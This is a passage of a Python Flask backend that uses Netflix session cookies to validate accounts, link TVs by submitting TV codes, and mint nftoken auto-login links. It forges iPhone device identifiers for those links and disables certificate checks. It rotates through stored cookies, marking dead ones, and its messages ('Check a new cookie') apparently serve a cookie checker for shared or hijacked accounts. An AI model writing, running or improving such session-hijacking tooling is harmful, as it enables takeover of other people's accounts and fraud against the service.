        soup = BeautifulSoup(resp.text, 'html.parser')

        # Step 2: Find the code submission form
        form = None

        # Try multiple selectors Netflix uses
        selectors = [
            {'data-uia': 'tv-code-form'},
            {'data-uia': 'witcher-code-form'},
            {'action': lambda x: x and 'tv8' in x.lower() if x else False},
        ]

        for selector in selectors:
            form = soup.find('form', selector)
            if form:
                break

        # Fallback: find any form with code input
        if not form:
            for f in soup.find_all('form'):
                code_input = f.find('input', {
                    'name': lambda x: x and any(kw in str(x).lower() for kw in ['code', 'rendezvous', 'pin']) if x else False
                })
                if code_input:
                    form = f
                    break

        if not form:
            # Check if already success page
            if 'success' in resp.text.lower() or 'all set' in resp.text.lower():
                return {
                    'status': 'success',
                    'message': 'TV is already linked! Check your TV screen.'
                }

            logger.error(f"No form found. Page snippet: {resp.text[:1000]}")
            return {
                'status': 'error',
                'message': 'Could not find TV code form. Netflix may have changed their page.'
            }

        # Step 3: Build form data
        action = form.get('action', 'https://www.netflix.com/tv8')
        if action.startswith('/'):
            action = 'https://www.netflix.com' + action

        form_data = {}

        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text').lower()

            if not name:
                continue

            if input_type == 'hidden':
                form_data[name] = value
            elif any(kw in name.lower() for kw in ['code', 'rendezvous', 'pin']):
                form_data[name] = code  # <-- USER'S 8-DIGIT CODE
            else:
                form_data[name] = value

        # Ensure code is set
        if 'code' not in form_data:
            form_data['code'] = code
        if 'tvLoginRendezvousCode' not in form_data:
            form_data['tvLoginRendezvousCode'] = code

        logger.info(f"Submitting code {code[:2]}**** to {action}")
        logger.info(f"Form fields: {list(form_data.keys())}")

        # Step 4: POST the code
        post_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/tv8",
        }

        post_resp = session.post(
            action,
            data=form_data,
            headers=post_headers,
            timeout=30,
            allow_redirects=True
        )

        # Step 5: Analyze response
        result_text = post_resp.text.lower()
        current_url = post_resp.url.lower()

        logger.info(f"POST status: {post_resp.status_code}, URL: {post_resp.url}")

        # Check for errors
        error_patterns = [
            ('invalid code', 'Invalid TV code. Please generate a new code on your TV.'),
            ('expired', 'TV code has expired. Generate a new one on your TV.'),
            ('already been used', 'Code already used. Generate a new one.'),
            ('maximum number of devices', 'Too many devices on this account.'),
            ('unable to process', 'Netflix error. Try again later.'),
            ('try again', 'Failed. Try a new code.'),
            ('sign in', 'Cookie expired. Check a new cookie.'),
            ('問題が発生しました', 'Netflix error (Japanese). Code may be invalid.'),
        ]

        for pattern, msg in error_patterns:
            if pattern in result_text or pattern in post_resp.text:
                return {'status': 'error', 'message': msg}

        # Check for success
        success_indicators = [
            'success', 'approved', 'all set', 'signed in', 'welcome',
            'start watching', 'device linked', 'tv is ready', 'good to go',
            'you\'re all set', 'now signed in'
        ]

        for indicator in success_indicators:
            if indicator in result_text:
                return {
                    'status': 'success',
                    'message': 'TV linked successfully! Your TV should be signed in within 10-30 seconds.'
                }

        # URL-based checks
        if 'success' in current_url or 'approved' in current_url:
            return {'status': 'success', 'message': 'TV authentication successful!'}

        if 'error' in current_url or 'failed' in current_url:
            return {'status': 'error', 'message': 'TV authentication failed. Try a new code.'}

        # Redirected away from tv8 = likely success
        if 'netflix.com' in current_url and 'tv8' not in current_url:
            return {
                'status': 'success',
                'message': 'Code processed! Check your TV - it should be signed in.'
            }

        # Still on tv8 with no error = might need confirmation
        if 'tv8' in current_url:
            return {
                'status': 'success',
                'message': 'Code accepted! Check your TV and confirm if prompted.'
            }

        # Unknown - assume success since no error found
        return {
            'status': 'success',
            'message': 'Code submitted. Check your TV - it should link within 30 seconds.'
        }

    except requests.RequestException as e:
        logger.error(f"Network error: {e}")
        return {'status': 'error', 'message': f'Network error: {str(e)}'}
    except Exception as e:
        logger.error(f"TV auth exception: {e}")
        return {'status': 'error', 'message': f'Error: {str(e)}'}

def find_working_stored_account(user_id):
    """
    Find the first working stored account for a user.
    Returns (netflix_id, source) or (None, None) if no working accounts found.
    """
    try:
        # Fetch active accounts for this user
        result = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('added_by', str(user_id))\
            .eq('is_active', True)\
            .order('created_at', desc=True)\
            .execute()

        accounts = result.data or []

        if not accounts:
            logger.warning(f"No stored accounts found for user {user_id}")
            return None, None

        logger.info(f"Found {len(accounts)} stored accounts for user {user_id}")

        for account in accounts:
            netflix_id = account.get('netflix_id')
            email = account.get('email', 'Unknown')

            if not netflix_id:
                logger.warning(f"Account {email} has no NetflixId, skipping")
                continue

            # Validate each account
            logger.info(f"Checking account: {email}...")
            is_valid, info = validate_netflix_cookie_quick(netflix_id)

            if is_valid:
                logger.info(f"Account {email} is VALID, using for TV auth")
                return netflix_id, 'stored'
            else:
                logger.warning(f"Account {email} is DEAD: {info.get('err', 'Unknown')}")
                # Mark as inactive in DB
                try:
                    supabase.table('netflix_accounts')\
                        .update({
                            'is_active': False, 
                            'deactivated_reason': info.get('err', 'Failed validation'),
                            'deactivated_at': datetime.utcnow().isoformat()
                        })\
                        .eq('id', account['id'])\
                        .execute()
                except Exception as e:
                    logger.error(f"Failed to mark account inactive: {e}")

                time.sleep(1.5)  # Rate limit between checks

        logger.warning(f"No working accounts found out of {len(accounts)} stored")
        return None, None

    except Exception as e:
        logger.error(f"Error finding working account: {e}")
        return None, None


def quick_check_netflix_id(netflix_id):
    """
    Quick validation of a NetflixId cookie.
    Returns {'ok': True} if valid, {'ok': False, 'err': 'reason'} if invalid.
    This is a lightweight version of check_netflix_cookie that only checks
    if the cookie can access the account page.
    """
    session = requests.Session()
    session.cookies.update({"NetflixId": netflix_id})

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        resp = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15)
        txt = resp.text
        txt_lower = txt.lower()

        # Check if redirected to login
        if '"mode":"login"' in txt_lower:
            return {'ok': False, 'err': 'Cookie expired - redirected to login'}

        # Check if on account page
        if '"mode":"yourAccount"' not in txt:
            if 'payment' in txt_lower or 'billing' in txt_lower:
                return {'ok': False, 'err': 'Payment required'}
            if 'membership has been canceled' in txt_lower:
                return {'ok': False, 'err': 'Membership cancelled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return {'ok': False, 'err': 'Membership expired'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return {'ok': False, 'err': 'Session expired'}
            return {'ok': False, 'err': 'Not logged in - invalid cookie'}

        # Check membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if status_match:
            status = status_match.group(1)
            if status != 'CURRENT_MEMBER':
                return {'ok': False, 'err': f'Membership status: {status}'}

        # Check if we can extract email (confirms valid account)
        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', txt)
        if not email_match:
            return {'ok': False, 'err': 'Could not verify account email'}

        return {'ok': True, 'email': email_match.group(1)}

    except requests.RequestException as e:
        return {'ok': False, 'err': f'Network error during validation: {str(e)}'}
    except Exception as e:
        return {'ok': False, 'err': f'Validation error: {str(e)}'}


def _auth_tv_code_improved(netflix_id, code):
    """
    IMPROVED TV code authentication with better error handling and detection.
    """
    session = requests.Session()
    session.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
    
    # Also set other common Netflix cookies if needed
    session.cookies.set("SecureNetflixId", netflix_id, domain=".netflix.com", path="/")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
    }

    try:
        # Step 1: GET tv8 page to establish session and get any necessary tokens
        logger.info("Step 1: Loading netflix.com/tv8...")
        resp = session.get("https://www.netflix.com/tv8", headers=headers, timeout=30)
        
        logger.info(f"TV8 page status: {resp.status_code}, URL: {resp.url}")
        
        if resp.status_code != 200:
            return {
                'status': 'error',
                'message': f'Failed to load tv8 page: HTTP {resp.status_code}'
            }

        # Check if we got redirected to login
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {
                'status': 'error',
                'message': 'Cookie expired. Netflix redirected to login page. Please check a new cookie.'
            }

        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Look for the code form - Netflix uses different form structures
        form = None
        form_selectors = [
            {'data-uia': 'witcher-code-form'},
            {'data-uia': 'tv-code-form'},
            {'action': lambda x: x and 'tv8' in x.lower() if x else False},
        ]
        
        for selector in form_selectors:
            form = soup.find('form', selector)
            if form:
                logger.info(f"Found form with selector: {selector}")
                break
        
        # Fallback: find any form with code input
        if not form:
            forms = soup.find_all('form')
            for f in forms:
                code_input = f.find('input', {
                    'name': lambda x: x and any(kw in x.lower() for kw in ['code', 'rendezvous', 'pin']) if x else False
                })
                if code_input:
                    form = f
                    logger.info(f"Found form with code input: {code_input.get('name')}")
                    break

        if not form:
            # Check if page indicates success or already logged in
            page_text = resp.text.lower()
            if 'success' in page_text and ('tv' in page_text or 'device' in page_text):
                return {
                    'status': 'success',
                    'message': 'Device may already be linked. Check your TV.'
                }
            
            # Check for Japanese error or other known errors
            if '問題が発生しました' in resp.text or 'テレビのリモコン' in resp.text:
                return {
                    'status': 'error',
                    'message': 'Netflix returned an error. The TV code may be invalid, expired, or this account cannot be used for TV authentication.'
                }
            
            logger.error("Could not find TV code form in page")
            # Log a snippet of the page for debugging
            logger.error(f"Page snippet: {resp.text[:1000]}")
            
            return {
                'status': 'error',
                'message': 'Could not find the TV code form. Netflix may have updated their page structure or the cookie is not valid for TV auth.'
            }

        # Extract form action
        action = form.get('action', 'https://www.netflix.com/tv8')
        if action.startswith('/'):
            action = 'https://www.netflix.com' + action

        # Build form data with ALL inputs
        form_data = {}
        auth_token = None
        
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text').lower()
            
            if name:
                if input_type == 'hidden':
                    form_data[name] = value
                    if 'auth' in name.lower() or 'token' in name.lower():
                        auth_token = value
                elif any(kw in name.lower() for kw in ['code', 'rendezvous', 'pin']):
                    form_data[name] = code
                else:
                    form_data[name] = value

        # Ensure code is set in common field names
        if 'code' not in form_data:
            form_data['code'] = code
        if 'tvLoginRendezvousCode' not in form_data:
            form_data['tvLoginRendezvousCode'] = code

        logger.info(f"Form data keys: {list(form_data.keys())}")
        if auth_token:
            logger.info(f"Found auth token: {auth_token[:20]}...")

        # Step 2: POST the form
        logger.info("Step 2: Submitting TV code...")
        post_headers = {
            **headers,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/tv8",
        }

        post_resp = session.post(
            action,
            data=form_data,
            headers=post_headers,
            timeout=30,
            allow_redirects=True
        )
        
        logger.info(f"POST response status: {post_resp.status_code}, URL: {post_resp.url}")

        # Step 3: Analyze response thoroughly
        result_text = post_resp.text
        result_lower = result_text.lower()
        result_soup = BeautifulSoup(result_text, 'html.parser')

        # Check for specific error messages first
        error_patterns = [
            ('問題が発生しました', 'Netflix error: Problem occurred. Code may be expired or invalid.'),
            ('テレビのリモコン', 'Netflix requires TV remote login. This account may not support web-based TV auth.'),
            ('invalid code', 'Invalid TV code. Please generate a new code on your TV.'),
            ('expired', 'TV code has expired. Please generate a new code.'),
            ('already been used', 'This code has already been used. Please generate a new code.'),
            ('maximum number of devices', 'Maximum number of devices reached for this account.'),
            ('unable to process', 'Netflix unable to process request. Try again later.'),
            ('try again', 'Request failed. Please try again with a new code.'),
            ('sign in', 'Netflix requires sign-in. Cookie may be expired.'),
        ]

        for pattern, message in error_patterns:
            if pattern in result_lower or pattern in result_text:
                logger.warning(f"Detected error pattern: {pattern}")
                return {'status': 'error', 'message': message}

        # Check for error boxes/divs
        error_elements = result_soup.find_all(['div', 'span', 'p'], {
            'class': lambda x: x and any(kw in x.lower() for kw in ['error', 'alert', 'warning', 'notification']) if x else False
        })
        
        for err_elem in error_elements:
            err_text = err_elem.get_text(strip=True)
            if err_text and len(err_text) > 3:
                logger.warning(f"Found error element: {err_text[:200]}")
                return {'status': 'error', 'message': f'Netflix error: {err_text[:200]}'}

        # Check for success indicators
        success_indicators = [
            'success', 'approved', 'you\'re all set', 'now signed in',
            'welcome', 'start watching', 'enjoy', 'all set',
            'device linked', 'tv is ready', 'good to go'
        ]

        for indicator in success_indicators:
            if indicator in result_lower:
                logger.info(f"Success indicator found: {indicator}")
                return {
                    'status': 'success',
                    'message': f'TV code approved! Your TV should be signed in now.'
                }

        # Check URL for success/failure indicators
        current_url = post_resp.url.lower()
        if 'success' in current_url or 'approved' in current_url:
            return {'status': 'success', 'message': 'TV authentication successful!'}
        
        if 'error' in current_url or 'failed' in current_url:
            return {'status': 'error', 'message': 'TV authentication failed. Please try a new code.'}

        # If redirected away from tv8, likely success
        if 'netflix.com' in current_url and 'tv8' not in current_url and 'tv' not in current_url:
            logger.info(f"Redirected to {current_url}, likely success")
            return {
                'status': 'success',
                'message': 'TV code processed successfully. Check your TV - it should be signed in.'
            }

        # Check if still on tv8 page (might need another step)
        if 'tv8' in current_url:
            # Check for "continue" or "confirm" buttons
            continue_btn = result_soup.find(['button', 'a'], {
                'class': lambda x: x and any(kw in x.lower() for kw in ['continue', 'confirm', 'submit']) if x else False
            })
            if continue_btn:
                return {
                    'status': 'success',
                    'message': 'Code accepted! Please confirm on your TV if prompted.'
                }

        # Unknown state - log for debugging
        logger.warning(f"Unknown TV auth state. URL: {post_resp.url}")
        logger.warning(f"Response preview: {result_text[:500]}")
        
        return {
            'status': 'unknown',
            'message': 'Response was unclear. The code may have been processed. Please check your TV.',
            'debug_info': {
                'url': post_resp.url,
                'status_code': post_resp.status_code
            }
        }

    except requests.RequestException as e:
        logger.error(f"Network error in TV auth: {str(e)}")
        return {'status': 'error', 'message': f'Network error: {str(e)}'}
    except Exception as e:
        logger.error(f"TV auth exception: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return {'status': 'error', 'message': f'Error: {str(e)}'}


def log_tv_auth_attempt(user_id, code, status, ip_address):
    """Log TV authentication attempts"""
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
        }

        log_data = {
            'user_id': str(user_id),
            'tv_code': code[:4] + '****',
            'status': status,
            'ip_address': str(ip_address) if ip_address else None
        }

        url = f"{SUPABASE_URL}/rest/v1/tv_auth_logs"
        resp = requests.post(url, headers=headers, json=log_data)

        if resp.status_code == 201:
            logger.info(f"TV auth log SUCCESS")
        else:
            logger.error(f"TV auth log FAILED: {resp.status_code}")

    except Exception as e:
        logger.error(f"TV auth log error: {str(e)}")

def validate_netflix_cookie_quick(netflix_id):
    """
    Quick but thorough validation of a NetflixId cookie.
    Returns (is_valid, account_info_or_error)
    """
    session = requests.Session()
    session.cookies.set("NetflixId", netflix_id, domain=".netflix.com")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        # First check: Can we access the account page?
        resp = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15)
        txt = resp.text
        txt_lower = txt.lower()
        
        # Check for login redirect
        if '"mode":"login"' in txt_lower or 'signin' in resp.url.lower():
            return False, {'err': 'Cookie expired - redirected to login', 'needs_recheck': True}
        
        # Check for account page
        if '"mode":"yourAccount"' not in txt:
            # Check specific error states
            if 'payment' in txt_lower and ('update' in txt_lower or 'required' in txt_lower):
                return False, {'err': 'Payment method update required'}
            if 'membership has been canceled' in txt_lower or 'canceled' in txt_lower:
                return False, {'err': 'Membership cancelled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return False, {'err': 'Membership expired - restart required'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return False, {'err': 'Session expired'}
            if 'on hold' in txt_lower:
                return False, {'err': 'Membership on hold'}
            return False, {'err': 'Not logged in - invalid cookie'}
        
        # Check membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if status_match:
            status = status_match.group(1)
            if status != 'CURRENT_MEMBER':
                return False, {'err': f'Membership status: {status}'}
        
        # Extract basic info for logging
        email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', txt)
        email = email_match.group(1) if email_match else 'Unknown'
        
        # Check if we can get country info
        country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', txt)
        country = country_match.group(1) if country_match else 'Unknown'
        
        # Check plan
        plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', txt)
        plan = plan_match.group(1) if plan_match else 'Unknown'
        
        # Check if premium (has UHD/4K or specific plan indicators)
        is_premium = '"isuhdavailable":true' in txt_lower or 'premium' in plan.lower()
        
        return True, {
            'email': email,
            'country': country,
            'plan': plan,
            'is_premium': is_premium
        }
        
    except requests.RequestException as e:
        return False, {'err': f'Network error: {str(e)}'}
    except Exception as e:
        return False, {'err': f'Validation error: {str(e)}'}

def generate_dynamic_esn():
    """Generate a random ESN that looks like a real device"""
    models = [
        ("IPHONE14-2", "d73ap"),  # iPhone 14 Pro
        ("IPHONE14-3", "d74ap"),  # iPhone 14 Pro Max
        ("IPHONE15-1", "d83ap"),  # iPhone 15
        ("IPHONE15-2", "d84ap"),  # iPhone 15 Pro
        ("IPHONE13-1", "d17ap"),  # iPhone 13 Pro
    ]
    model, board = random.choice(models)
    
    # Generate random serial-like string
    serial = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
    
    esn = f"NFAPPL-02-{model}%3D1-PXA-{serial}"
    return esn, model, board

def generate_guid():
    """Generate a random Netflix GUID"""
    parts = [
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)),
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)),
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)),
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=4)),
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)),
    ]
    return '-'.join(parts)

def generate_token_improved(netflix_id, secure_netflix_id=None):
    """
    IMPROVED token generation with dynamic device params.
    Falls back to direct nftoken link if generation fails.
    """
    esn, model, board = generate_dynamic_esn()
    guid = generate_guid()
    
    # Randomize app version slightly
    versions = ["17.12.0", "17.11.2", "17.10.1", "16.50.0", "16.45.2"]
    app_version = random.choice(versions)
    ios_versions = ["17.4.1", "17.3.1", "17.2.1", "16.7.2", "16.6.1"]
    ios_version = random.choice(ios_versions)
    
    url = f"https://ios.prod.ftl.netflix.com/iosui/user/{app_version.split('.')[0]}.{app_version.split('.')[1]}"
    
    config = {
        "gamesInTrailersEnabled": "false",
        "isTrailersEvidenceEnabled": "false",
        "cdsMyListSortEnabled": "true",
        "kidsBillboardEnabled": "true",
        "addHorizontalBoxArtToVideoSummariesEnabled": "false",
        "skOverlayTestEnabled": "false",
        "homeFeedTestTVMovieListsEnabled": "false",
        "baselineOnIpadEnabled": "true",
        "trailersVideoIdLoggingFixEnabled": "true",
        "postPlayPreviewsEnabled": "false",
        "bypassContextualAssetsEnabled": "false",
        "roarEnabled": "false",
        "useSeason1AltLabelEnabled": "false",
        "disableCDSSearchPaginationSectionKinds": ["searchVideoCarousel"],
        "cdsSearchHorizontalPaginationEnabled": "true",
        "searchPreQueryGamesEnabled": "true",
        "kidsMyListEnabled": "true",
        "billboardEnabled": "true",
        "useCDSGalleryEnabled": "true",
        "contentWarningEnabled": "true",
        "videosInPopularGamesEnabled": "true",
        "avifFormatEnabled": "false",
        "sharksEnabled": "true"
    }
    
    params = {
        'appVersion': app_version,
        'config': json.dumps(config),
        'device_type': "NFAPPL-02-",
        'esn': esn,
        'idiom': "phone",
        'iosVersion': ios_version,
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "390",
        'model': board,
        'modelType': model,
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "3.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': f"Argo/{app_version} (iPhone; iOS {ios_version}; Scale/3.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': guid,
        'x-netflix.context.profile-guid': guid,
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~' + app_version + '/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': app_version,
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2024.1",
        'x-netflix.client.appversion': app_version,
        'x-netflix.context.max-device-width': "390",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': generate_guid(),
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': urllib.parse.unquote(esn),
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': generate_guid(),
        'x-netflix.client.iosversion': ios_version,
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': ios_version,
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': str(random.randint(5, 15)),
        'x-netflix.context.pixel-density': "3.0",
        'x-netflix.request.toplevel.uuid': generate_guid(),
        'x-netflix.request.client.timezoneid': random.choice([
            "Asia/Manila", "Asia/Singapore", "Asia/Tokyo", 
            "America/New_York", "Europe/London", "Australia/Sydney"
        ]),
        'Cookie': f"NetflixId={netflix_id}" + (f"; SecureNetflixId={secure_netflix_id}" if secure_netflix_id else "")
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        
        if response.status_code != 200:
            logger.error(f"Token generation failed: HTTP {response.status_code}")
            logger.error(f"Response: {response.text[:500]}")
            return None
            
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
            
            return {
                "status": "Success",
                "token": token,
                "expires": expires,
                "login_urls": {
                    "phone": f"https://netflix.com/unsupported?nftoken={token}",
                    "tv": f"https://netflix.com/tv8?nftoken={token}",
                    "pc": f"https://netflix.com/browse?nftoken={token}"
                }
            }
            
        logger.error(f"Token generation: No token in response. Keys: {list(data.keys())}")
        return None
        
    except Exception as e:
        logger.error(f"Token generation error: {str(e)}")
        return None

@app.route('/api/tv-login-link', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def generate_tv_login_link(user):
    """
    Generate a direct TV login link using nftoken.
    User opens this link on their phone/PC while on the same network as the TV,
    and Netflix will link the TV automatically.
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()
        account_id = data.get('account_id')
        custom_netflix_id = data.get('netflix_id', '').strip()

        netflix_id = None
        
        # Case 1: Use specific account from DB
        if account_id:
            account = supabase.table('netflix_accounts')\
                .select('*')\
                .eq('id', account_id)\
                .eq('is_active', True)\
                .single()\
                .execute()
            
            if not account.data:
                return jsonify({'status': 'error', 'message': 'Account not found'}), 404
                
            # Extract NetflixId from cookie_data
            cookie_data = account.data.get('cookie_data', '')
            cookies = parse_cookie_string(cookie_data)
            netflix_id = cookies.get('NetflixId')
            secure_id = cookies.get('SecureNetflixId')
            
        # Case 2: Use custom NetflixId
        elif custom_netflix_id:
            netflix_id = custom_netflix_id
            secure_id = None
            
        else:
            # Case 3: Find working stored account
            result = supabase.table('netflix_accounts')\
                .select('*')\
                .eq('added_by', str(user.id))\
                .eq('is_active', True)\
                .order('created_at', desc=True)\
                .execute()
            
            for acc in result.data or []:
                cookies = parse_cookie_string(acc.get('cookie_data', ''))
                nid = cookies.get('NetflixId')
                if nid:
                    # Quick validation
                    is_valid, _ = validate_netflix_cookie_quick(nid)
                    if is_valid:
                        netflix_id = nid
                        secure_id = cookies.get('SecureNetflixId')
                        break

        if not netflix_id:
            return jsonify({
                'status': 'error',
                'message': 'No working NetflixId found. Please check a cookie first.'
            }), 400

        # Generate token
        token_result = generate_token_improved(netflix_id, secure_id)
        
        if not token_result:
            return jsonify({
                'status': 'error',
                'message': 'Failed to generate token. Netflix may have blocked this request.'
            }), 500

        # Log generation
        log_token_generation(
            account_id=account_id or 'custom',
            user_id=user.id,
            ip_address=request.remote_addr,
            token=token_result['token']
        )

        return jsonify({
            'status': 'success',
            'data': {
                'token': token_result['token'],
                'expires': token_result['expires'],
                'login_urls': token_result['login_urls'],
                'instructions': [
                    '1. Make sure your TV is on the Netflix sign-in screen showing a code',
                    '2. Open the TV link below on your PHONE or PC (NOT the TV browser)',
                    '3. You will be logged into Netflix automatically',
                    '4. The TV should link within 10-30 seconds'
                ]
            }
        })

    except Exception as e:
        logger.error(f"TV login link error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500
#--------------------------------------------------------------

if __name__ == '__main__':
    app.run(debug=True)
